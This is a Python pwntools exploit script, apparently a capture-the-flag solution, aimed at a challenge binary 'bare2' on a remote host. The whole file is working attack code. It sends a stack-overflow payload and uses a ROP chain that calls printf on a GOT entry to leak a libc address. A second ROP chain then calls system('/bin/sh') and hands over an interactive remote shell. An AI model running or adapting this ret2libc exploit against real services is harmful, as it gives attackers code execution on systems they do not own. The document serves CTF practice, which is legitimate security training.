#!/usr/bin/env python3
from pwn import *

# ----------------------Packing Utils----------------------#
p64 = lambda n: packing.pack(n, 64)
u64 = lambda n: packing.unpack(n, 64)
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
# ---------------------Common Settings---------------------#
bin_path = './bare2'
local_libc_path = './libc.so.6'
remote_url = 'chal.firebird.sh'
remote_port = 35034

context.log_level = 'debug'
context.binary = bin_path

gdb_break_points = [
    ''
]


# ---------------------------------------------------------#
# ------------------------Exploit--------------------------#
# ---------------------------------------------------------#
def initialize_io(mode: str) -> process | remote:
    gdbscripts = "handle SIGALRM ignore\n"
    for bp in gdb_break_points:
        if bp:  # is not empty str
            gdbscripts += f"b* {bp}\n"

    if mode == "_debug":
        # context.terminal = ["tmux", "splitw", "-h"]
        return gdb.debug(bin_path, gdbscripts)
    elif mode == "_local":
        return process(bin_path)
    elif mode == "_remote":
        return remote(remote_url, remote_port)
    else:
        exit(-1)


# -----------------------Main Pwn--------------------------#
def do_pwn(io: process | remote) -> None:
    sla = io.sendlineafter
    ru = io.recvuntil

    rop = ROP(bin_path)
    elf = ELF(bin_path)
    libc = ELF(local_libc_path)

    def exploit() -> None:
        # Round 1
        payload = flat(
            b'A' * 0x10,
            b'B' * 8,
            p64(rop.rdi.address),
            p64(elf.got['printf']),
            p64(rop.ret.address),
            p64(elf.plt['printf']),
            elf.sym['bare']
        )
        sla(b'name???\n', payload)

        # Leak info
        printf_addr = uu64(ru(b'\x7f'))
        print(f'{hex(printf_addr)=}')
        libc.address = printf_addr - libc.sym['printf']
        print(f'{hex(libc.address)=}')

        # Round 2
        payload = flat(
            b'A' * 0x10,
            b'B' * 8,
            p64(rop.rdi.address),
            p64(next(libc.search(b'/bin/sh\x00'))),
            p64(libc.sym['system'])
        )
        sla(b'name???\n', payload)

    exploit()


# ---------------------------------------------------------#
# --------------------End of Exploit-----------------------#
# ---------------------------------------------------------#

def main():
    mode = "_local"
    mode = "_debug"
    mode = "_remote"

    io = initialize_io(mode)
    do_pwn(io)
    io.interactive()


if __name__ == '__main__':
    main()
# ----------------------------EOF---------------------------#
